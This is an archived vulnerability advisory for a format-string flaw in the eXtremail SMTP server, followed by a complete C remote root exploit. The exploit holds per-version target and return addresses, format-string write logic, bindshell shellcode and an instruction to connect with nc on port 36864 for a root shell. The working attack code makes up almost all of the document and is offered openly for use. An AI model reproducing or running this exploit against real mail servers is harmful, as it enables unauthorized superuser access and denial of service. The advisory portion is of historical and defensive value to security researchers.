source: http://www.securityfocus.com/bid/2908/info
 
eXtremail is a freeware SMTP server available for Linux and AIX.
 
eXtremail contains a format-string vulnerability in its logging mechanism. Attackers can send SMTP commands argumented with maliciously constructed arguments that will exploit this vulnerability.
 
eXtremail runs with root privileges. By exploiting this vulnerability, remote attackers can gain superuser access on the underlying host and can crash eXtremail. If the system is not restarted automatically, a denial of SMTP service will result.
 
UPDATE (April 26, 2004): Reportedly, this vulnerability has been reintroduced into the new version (1.5.9) of eXtremail.
 
UPDATE (October 26, 2007): Reports indicate that the 'USER' command of eXtremail 2.1.1 and prior is still vulnerable. Symantec has not confirmed this. 

/* eXtremail-exp.c
 *
 * - eXtremail v1.1.5-9 Remote Root Exploit (x86) -
 *
 * - Tested on: RedHat 7.0 eXtremail v1.1.5
 *              RedHat 7.0 eXtremail v1.1.6
 *              RedHat 7.0 eXtremail v1.1.7
 *              RedHat 7.0 eXtremail v1.1.8
 *              RedHat 7.0 eXtremail v1.1.9
 *              NOT VULNERABLE eXtremail v1.1.10
 *
 * Copyright (c) 2001 by <mu-b@digit-labs.org>
 *
 * eXtremail v1.1.5+ has a format string problem
 * in flog(). This problem affects all user commands
 * (helo/ehlo/mail from:/rcpt to:), and is caused
 * by an improper fprintf() to the servers logfile.
 *
 * Buffers for helo/ehlo are too small (except v1.1.5),
 * therefore we use mail from: instead :). 
 *
 * Note: Return Address's are quite tight due to the small
 *       buffers. Returning to the Heap is possible but
 *       is VERY unstable.
 *
 * Greets: mjm, all@alldas.de, teleh0r, grazer, cmds, gollum, #!digit-labs
 *
 * http://www.digit-labs.org/ -- Digit-Labs 2001!@$!
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <resolv.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/stat.h>

#define NOP		0x41
#define NUMVULN	4
#define OFFSET	0
#define PORT	25

void banner();
void mkfmt();
int opensocket(char *);
void usage();

char buf[520];
int buflength, type = 0, sock;
unsigned long target, retaddr;

unsigned char shellcode[]= /* lamagra bindshell code */
	"\xeb\x6e\x5e\x29\xc0\x89\x46\x10"
	"\x40\x89\xc3\x89\x46\x0c\x40\x89"
    	"\x46\x08\x8d\x4e\x08\xb0\x66\xcd"
    	"\x80\x43\xc6\x46\x10\x10\x88\x46"
    	"\x08\x31\xc0\x31\xd2\x89\x46\x18"
    	"\xb0\x90\x66\x89\x46\x16\x8d\x4e"
    	"\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
    	"\x66\xcd\x80\x89\x5e\x0c\x43\x43"
    	"\xb0\x66\xcd\x80\x89\x56\x0c\x89"
    	"\x56\x10\xb0\x66\x43\xcd\x80\x86"
    	"\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0"
    	"\x3f\x41\xcd\x80\xb0\x3f\x41\xcd"
    	"\x80\x88\x56\x07\x89\x76\x0c\x87"
    	"\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80"
    	"\xe8\x8d\xff\xff\xff\x2f\x62\x69"
    	"\x6e\x2f\x73\x68";

/*   target address's  -> objdump -R smtpd | grep "fflush"   */
struct {
	char *name;
	unsigned long target;
	unsigned long retaddr;
	int padding;
	int buflength;
} targets[] = {
        { "RedHat 7.0 eXtremail v1.1R5", 0x080864e0, 0xbf1ff64a, 1, 500},
        { "RedHat 7.0 eXtremail v1.1R6", 0x08089d5c, 0xbf1ff5d6, 1, 266},
        { "RedHat 7.0 eXtremail v1.1R7", 0x0808b3fc, 0xbf1ff5d6, 1, 266},
        { "RedHat 7.0 eXtremail v1.1R8", 0x0808b6fc, 0xbf1ff5d6, 1, 266},
        { "RedHat 7.0 eXtremail v1.1R9", 0x08088890, 0xbf1ff5d6, 1, 266},
        { 0 } };

void banner()
{
   fprintf(stderr, "\neXtremail V1.1R5-9 remote root exploit\n");
   fprintf(stderr, "by: <mu-b@digit-labs.org>\n");
   fprintf(stderr, "Copyright (c) 2001 Digit-Labs!@#$!\n");
   fprintf(stderr, "http://www.digit-labs.org\n\n");
}

void mkfmt()
{
   int i, j = 0, num;
   int bytesofar;
   int fmtints[4];
   char *bufptr;
   unsigned char temp[4];

   bytesofar = 35 + targets[type].padding;
   bufptr = &buf[strlen(buf)];

   temp[0] = (unsigned char) (target & 0x000000ff);
   temp[1] = (unsigned char)((target & 0x0000ff00) >> 8);
   temp[2] = (unsigned char)((target & 0x00ff0000) >> 16);
   temp[3] = (unsigned char)((target & 0xff000000) >> 24);

   for(i = 0; i < 4; i++)
   {
      sprintf(bufptr, "%c%c%c%c", temp[0], temp[1], temp[2], temp[3]);
      bufptr += 4;
      temp[0]++;
   }

   fmtints[0] = (int) (retaddr & 0x000000ff);
   fmtints[1] = (int)((retaddr & 0x0000ff00) >> 8);
   fmtints[2] = (int)((retaddr & 0x00ff0000) >> 16);
   fmtints[3] = (int)((retaddr & 0xff000000) >> 24);
   
   for(i = 0; i < 4; i++)
   {
      num = 0;

      if(fmtints[i] - bytesofar < 10)
      {
         while(num != 1)
         {
            fmtints[i] = (fmtints[i] + 0x100);
            if(fmtints[i] - bytesofar > 9)
            {
               fmtints[i] -= bytesofar;
               bytesofar += fmtints[i];
               num = 1;
            }
         }
      }
      else
      {
         fmtints[i] -= bytesofar;
         bytesofar += fmtints[i];
      }
   }

   sprintf(bufptr, "%%.%du%%38$n%%.%du%%39$n%%.%du%%40$n%%.%du%%41$n", fmtints[0], fmtints[1], fmtints[2], fmtints[3]);

   for(i = strlen(buf); i < buflength - strlen(shellcode) - 1; i++)
      buf[i] = NOP;

   for(i = i; i < buflength - 1; i++)
   {
      buf[i] = shellcode[j];
      j++;
   }

   buf[buflength - 1] = '\n';
   buf[buflength] = '\0';
   write(sock, buf, strlen(buf));
}

int opensocket(char *host)
{
   int s;
   struct sockaddr_in remote_sin;
   struct hostent *he;

   if((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
      perror("socket()");
      return -1;
   }

   memset((char *)&remote_sin, 0, sizeof(remote_sin));
   if((he = gethostbyname(host)) != NULL)
      memcpy((char *)&remote_sin.sin_addr, he->h_addr, he->h_length);
   else if((remote_sin.sin_addr.s_addr = inet_addr(host)) < 0) {
         perror("gethostbyname()/inet_addr()");
         return -1;
   }

   remote_sin.sin_family = PF_INET;
   remote_sin.sin_port = htons(PORT);

   if(connect(s, (struct sockaddr *)&remote_sin, sizeof(remote_sin)) == -1) {
      perror("connect()");
      close(s);
      return -1;
   }
	      
   return s;
}

void usage()
{
   int i;

   fprintf(stderr, "Usage: ./extremail <host> [type]\n");
   fprintf(stderr, "\nTargets:\n");

   for (i = 0; targets[i].name; i++)
      fprintf(stderr, "\t%d.\t%s\n", i, targets[i].name);

   fprintf(stderr, "\n");	
   exit(0);
}

int main (int argc, char *argv[])
{
   char *host;
   int i;

   banner();

   if(argc < 2)
      usage();
  
   if(argc >= 3)
      type = atoi(argv[2]);

   if(type > NUMVULN)
      type = 0;
   
   host = argv[1];
   buflength = targets[type].buflength;
   target = targets[type].target;
   retaddr = targets[type].retaddr + OFFSET;

   fprintf(stderr, "Target:\t\t%s\nType:\t\t%s\n", host, targets[type].name);
   fprintf(stderr, "Target Address:\t%p\nReturn Address:\t%p\nOffset:\t\t%d\n", target, retaddr, OFFSET);
   fprintf(stderr, "Buflength:\t%d\n", buflength);   

   if ((sock = opensocket(host)) <= 0)
      return -1;

   fprintf(stderr, "\nConnected....\n");

   memcpy(buf, "MAIL FROM:<", 11);
   
   for(i = 0; i < targets[type].padding; i++)
      buf[strlen(buf)] = 0x61;

   sleep(1);
   write(sock, "HELO digit-labs.org!@#$!\n", 26);

   sleep(1);
   mkfmt();

   sleep(1);
   close(sock);

   fprintf(stderr, "\n[1] sent payload....\n");
   fprintf(stderr, "[2] waiting....\n");
   sleep(2);
   fprintf(stderr, "[3] nc %s 36864 for shell....\n\n", host);

   return;
}